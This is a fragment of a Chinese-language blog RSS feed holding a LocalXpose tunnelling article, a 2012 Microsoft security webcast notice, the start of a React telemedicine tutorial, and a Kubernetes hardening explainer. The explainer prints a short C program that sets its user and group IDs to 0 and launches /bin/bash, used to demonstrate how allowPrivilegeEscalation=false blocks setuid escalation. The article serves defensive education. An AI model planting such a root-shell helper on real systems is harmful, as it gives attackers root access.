&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;高级功能&#34;&gt;高级功能
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;自定义域名&lt;/strong&gt;：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;loclx tunnel http --to localhost:3000 --reserved-domain yourdomain.com
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;实时监控&lt;/strong&gt;：可查看请求头、正文等详细信息&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;性能指标&lt;/strong&gt;：响应时间、数据传输等监控数据&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;定价方案&#34;&gt;定价方案
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;免费版&lt;/strong&gt;：支持HTTP/s，4个活动隧道&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;专业版&lt;/strong&gt;($6/月)：支持TCP/UDP，10个活动隧道&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;企业版&lt;/strong&gt;：定制化方案，无限隧道&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;典型应用场景&#34;&gt;典型应用场景
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;远程协作&lt;/strong&gt;：实时分享开发进度&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;演示展示&lt;/strong&gt;：向客户展示开发成果&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Webhook测试&lt;/strong&gt;：无需部署即可测试&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;IoT设备访问&lt;/strong&gt;：远程访问物联网设备&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;LocalXpose正在彻底改变开发者共享本地主机的方式，无论是独立开发者还是分布式团队，都能从中受益。这款工具不仅简化了开发流程，更通过安全可靠的方式提升了协作效率。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>2012年8月微软安全公告网络研讨会问答与幻灯片</title>
        <link>http://localhost:1313/p/2012%E5%B9%B48%E6%9C%88%E5%BE%AE%E8%BD%AF%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A%E7%BD%91%E7%BB%9C%E7%A0%94%E8%AE%A8%E4%BC%9A%E9%97%AE%E7%AD%94%E4%B8%8E%E5%B9%BB%E7%81%AF%E7%89%87/</link>
        <pubDate>Mon, 04 Aug 2025 20:40:37 +0800</pubDate>
        
        <guid>http://localhost:1313/p/2012%E5%B9%B48%E6%9C%88%E5%BE%AE%E8%BD%AF%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A%E7%BD%91%E7%BB%9C%E7%A0%94%E8%AE%A8%E4%BC%9A%E9%97%AE%E7%AD%94%E4%B8%8E%E5%B9%BB%E7%81%AF%E7%89%87/</guid>
        <description>&lt;h3 id=&#34;网络研讨会内容发布&#34;&gt;网络研讨会内容发布
&lt;/h3&gt;&lt;p&gt;今天我们发布了2012年8月安全公告网络研讨会的问答页面。在研讨会期间，我们回答了12个技术问题，主要涉及：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;MS12-060&lt;/strong&gt; - Windows通用控件安全更新&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;MS12-052&lt;/strong&gt; - Internet Explorer累积性安全更新&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;安全建议2661254&lt;/strong&gt; - 关于RSA密钥长度小于1024位的证书信任问题&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;另有3个问题在研讨会后补充回答，所有问答均已收录至Q&amp;amp;A页面。&lt;/p&gt;
&lt;h3 id=&#34;下期活动预告&#34;&gt;下期活动预告
&lt;/h3&gt;&lt;p&gt;诚邀客户参加将于太平洋时间9月12日上午11点（UTC-7）举行的下一期公开网络研讨会，届时将深入解析9月安全公告并实时解答问题。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注册信息：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;日期：2012年9月12日（周三）&lt;/li&gt;
&lt;li&gt;时间：太平洋时间上午11点（UTC-7）&lt;/li&gt;
&lt;li&gt;注册链接：AttendeeRegistration**&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;附件下载&#34;&gt;附件下载
&lt;/h3&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;%e5%8e%9f%e5%a7%8bPPT%e6%96%87%e4%bb%b6&#34; &gt;August 2012 Security Bulletin Webcast - Final - Customer Ready.pptx&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
</description>
        </item>
        <item>
        <title>深入解析Kubernetes安全配置：allowPrivilegeEscalation的真相与误区</title>
        <link>http://localhost:1313/p/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90kubernetes%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AEallowprivilegeescalation%E7%9A%84%E7%9C%9F%E7%9B%B8%E4%B8%8E%E8%AF%AF%E5%8C%BA/</link>
        <pubDate>Mon, 04 Aug 2025 20:24:21 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90kubernetes%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AEallowprivilegeescalation%E7%9A%84%E7%9C%9F%E7%9B%B8%E4%B8%8E%E8%AF%AF%E5%8C%BA/</guid>
        <description>&lt;h1 id=&#34;停止对allowprivilegeescalation的过度担忧&#34;&gt;停止对&amp;rsquo;allowPrivilegeEscalation&amp;rsquo;的过度担忧
&lt;/h1&gt;&lt;p&gt;Kubernetes安全上下文允许您在pod或容器级别配置安全选项。虽然某些参数已被充分理解，但其他参数可能更加晦涩难懂。本文将揭穿关于allowPrivilegeEscalation选项的迷思。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TL;DR&lt;/strong&gt; - allowPrivilegeEscalation是一个安全加固选项，仅此而已。如果您能将其关闭作为快速安全措施，请务必这样做！否则，它本身不会导致系统被入侵。如果您没有显式禁用它，可能也没问题。&lt;/p&gt;
&lt;h2 id=&#34;什么是allowprivilegeescalation&#34;&gt;什么是&amp;rsquo;allowPrivilegeEscalation&amp;rsquo;？
&lt;/h2&gt;&lt;p&gt;询问任何安全工程师是否应允许您的应用程序&amp;quot;提升权限&amp;quot;，您可能会得到茫然的眼神、困惑的表情，甚至可能被质疑您的理智。&lt;/p&gt;
&lt;p&gt;好消息是：这里存在误解。当您问：
&amp;ldquo;如果我没有显式将&amp;rsquo;allowPrivilegeEscalation&amp;rsquo;标志设为false有关系吗？&amp;rdquo;
&amp;hellip;您的安全工程师听到的是：
&amp;ldquo;如果我不安全的Java应用能逃逸容器并在集群中肆意妄为，这没问题吗？&amp;rdquo;&lt;/p&gt;
&lt;h2 id=&#34;关于allowprivilegeescalation的常见误解&#34;&gt;关于&amp;rsquo;allowPrivilegeEscalation&amp;rsquo;的常见误解
&lt;/h2&gt;&lt;p&gt;开门见山：虽然关闭allowPrivilegeEscalation很有价值，但它只是一个您可以利用来增强容器化环境安全的安全加固设置。&lt;/p&gt;
&lt;p&gt;具体来说，如果您将allowPrivilegeEscalation保留为true(其默认值)：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;它不会神奇地允许容器中的非特权进程将其权限提升至root&lt;/li&gt;
&lt;li&gt;它不会允许容器内运行的进程逃逸容器&lt;/li&gt;
&lt;li&gt;它不会允许pod在集群内执行任何类型的权限提升&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;allowprivilegeescalation实战&#34;&gt;&amp;lsquo;allowPrivilegeEscalation&amp;rsquo;实战
&lt;/h2&gt;&lt;p&gt;让我们重现一个场景：漏洞允许非特权进程在容器内将其权限提升至root。这可能发生在DirtyCow、DirtyPipe或OverlayFS中的CVE-2023-0386等内核级漏洞中。&lt;/p&gt;
&lt;p&gt;我们使用以下程序，它使用setreuid和setregid有效地将权限提升至root：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;setreuid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;setregid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;environ&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;execve&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;environ&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;当我们在Kubernetes集群中运行此容器并显式打开allowPrivilegeEscalation(尽管这是默认值)时，我们能够利用漏洞将权限提升至root。但如果我们将allowPrivilegeEscalation设为false，setreuid和setregid调用将失败。&lt;/p&gt;
&lt;h2 id=&#34;allowprivilegeescalation工作原理&#34;&gt;&amp;lsquo;allowPrivilegeEscalation&amp;rsquo;工作原理
&lt;/h2&gt;&lt;p&gt;根据Kubernetes文档：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;AllowPrivilegeEscalation控制进程是否可以获得比其父进程更多的权限。此布尔值直接控制是否会在容器进程上设置no_new_privs标志。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;no_new_privs标志是2012年发布的Linux 3.5内核中引入的功能。启用后，它确保没有子进程可以获得比其父进程更多的权限。&lt;/p&gt;
&lt;p&gt;容器运行时(如runc)在创建新容器化进程时会执行此操作：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;config&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;NoNewPrivileges&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;unix&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Prctl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;unix&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;PR_SET_NO_NEW_PRIVS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;SyscallError&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Syscall&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;prctl(SET_NO_NEW_PRIVS)&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;结论&#34;&gt;结论
&lt;/h2&gt;&lt;p&gt;安全就像大多数试图处理系统性故障的学科一样，是关于构建不同层次以确保单个缺陷不会变成数据泄露。&lt;/p&gt;
&lt;p&gt;在此背景下：是的，显式关闭allowPrivilegeEscalation是一种合理的安全加固实践。关闭它可以大大提高攻击者入侵非特权应用程序后无法将其权限提升至容器内root的信心，从而降低利用需要root权限的进一步漏洞的风险。&lt;/p&gt;
&lt;p&gt;如果您没有在工作负载上关闭它，这很糟糕吗？可能不会。将其视为您尚未启用的(又一个)加固机制。除非您是一个成熟的安全团队，否则您最好首先专注于容器安全路线图中更有价值的项目。&lt;/p&gt;
&lt;h2 id=&#34;常见问题解答&#34;&gt;常见问题解答
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;&amp;lsquo;allowPrivilegeEscalation&amp;rsquo;的默认值是什么？&lt;/strong&gt;
默认为true。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果我的工作负载在容器内以root身份运行，关闭&amp;rsquo;allowPrivilegeEscalation&amp;rsquo;有意义吗？&lt;/strong&gt;
没有意义。如果工作负载以root身份运行，它们在容器内无法实现进一步的权限提升。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;关闭&amp;rsquo;allowPrivilegeEscalation&amp;rsquo;是否能防止容器内的所有权限提升？&lt;/strong&gt;
不能。例如，如果攻击者利用允许他们提升权限的内核漏洞，它将无济于事。也就是说，它应该阻止所有通过利用setuid/setgid工作的权限提升。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>使用React和Stream视频聊天SDK构建远程医疗应用</title>
        <link>http://localhost:1313/p/%E4%BD%BF%E7%94%A8react%E5%92%8Cstream%E8%A7%86%E9%A2%91%E8%81%8A%E5%A4%A9sdk%E6%9E%84%E5%BB%BA%E8%BF%9C%E7%A8%8B%E5%8C%BB%E7%96%97%E5%BA%94%E7%94%A8/</link>
        <pubDate>Mon, 04 Aug 2025 20:02:15 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BD%BF%E7%94%A8react%E5%92%8Cstream%E8%A7%86%E9%A2%91%E8%81%8A%E5%A4%A9sdk%E6%9E%84%E5%BB%BA%E8%BF%9C%E7%A8%8B%E5%8C%BB%E7%96%97%E5%BA%94%E7%94%A8/</guid>
        <description>&lt;img src="https://i.imgs.ovh/2025/08/04/YgCrn.png" alt="Featured image of post 使用React和Stream视频聊天SDK构建远程医疗应用" /&gt;&lt;h1 id=&#34;使用react和stream视频聊天sdk构建远程医疗应用&#34;&gt;使用React和Stream视频聊天SDK构建远程医疗应用
&lt;/h1&gt;&lt;p&gt;还记得COVID-19疫情期间所有事物都转移到线上的情形吗？包括医生问诊在内，居家成为了最安全的选择。这一时刻引发了医疗保健交付方式的重大转变。远程医疗不再只是权宜之计，而成为了现代医疗的核心组成部分。随着需求增长，开发者们正在构建安全、实时的平台，连接来自任何地方的患者和医疗服务提供者。&lt;/p&gt;
&lt;p&gt;在本文中，您将学习如何使用Stream的React视频和聊天SDK构建远程医疗应用。您将设置认证、创建视频通话、启用消息功能，并设计一个模拟真实世界远程医疗工作流程的功能性用户界面。&lt;/p&gt;
&lt;h2 id=&#34;大纲&#34;&gt;大纲
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;介绍&lt;/li&gt;
&lt;li&gt;前提条件&lt;/li&gt;
&lt;li&gt;应用结构&lt;/li&gt;
&lt;li&gt;项目设置&lt;/li&gt;
&lt;li&gt;后端设置&lt;/li&gt;
&lt;li&gt;前端设置&lt;/li&gt;
&lt;li&gt;Stream聊天和视频集成&lt;/li&gt;
&lt;li&gt;聊天和视频功能(前端)&lt;/li&gt;
&lt;li&gt;项目演示&lt;/li&gt;
&lt;li&gt;结论&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;前提条件&#34;&gt;前提条件
&lt;/h2&gt;&lt;p&gt;开始本教程前，请确保您具备：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;React基础知识&lt;/li&gt;
&lt;li&gt;电脑上已安装Node.js和npm/yarn&lt;/li&gt;
&lt;li&gt;Stream免费账户&lt;/li&gt;
&lt;li&gt;熟悉Stream SDK&lt;/li&gt;
&lt;li&gt;了解Tailwind CSS用于样式设计&lt;/li&gt;
&lt;li&gt;使用VS Code和Postman(用于API测试)的经验&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;应用结构&#34;&gt;应用结构
&lt;/h2&gt;&lt;p&gt;在深入代码前，了解应用结构很有帮助。&lt;/p&gt;
&lt;h3 id=&#34;应用流程结构&#34;&gt;应用流程结构
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;登录页面
&lt;ul&gt;
&lt;li&gt;导航
&lt;ul&gt;
&lt;li&gt;首页&lt;/li&gt;
&lt;li&gt;关于&lt;/li&gt;
&lt;li&gt;注册
&lt;ul&gt;
&lt;li&gt;验证账户
&lt;ul&gt;
&lt;li&gt;登录
&lt;ul&gt;
&lt;li&gt;仪表盘
&lt;ul&gt;
&lt;li&gt;Stream聊天&lt;/li&gt;
&lt;li&gt;Stream视频&lt;/li&gt;
&lt;li&gt;登出&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;项目设置&#34;&gt;项目设置
&lt;/h2&gt;&lt;p&gt;开始前，创建两个文件夹：&amp;ldquo;Frontend&amp;quot;处理客户端代码，&amp;ldquo;Backend&amp;quot;处理服务器端逻辑。这种分离让您能高效管理应用的这两部分。&lt;/p&gt;
&lt;h3 id=&#34;为前端设置react&#34;&gt;为前端设置React
&lt;/h3&gt;&lt;p&gt;创建文件夹后，您可以在Frontend文件夹中设置React应用。&lt;/p&gt;
&lt;p&gt;首先使用命令&lt;code&gt;cd Frontend&lt;/code&gt;导航到Frontend目录。&lt;/p&gt;
&lt;p&gt;现在您可以初始化React项目。您将使用Vite，一个快速的React应用构建工具。&lt;/p&gt;
&lt;p&gt;要创建React项目，运行以下命令：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;npm create vite@latest &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;项目名称&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; -- --template react
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;接下来，使用命令导航到新项目文件夹：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;项目名称&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
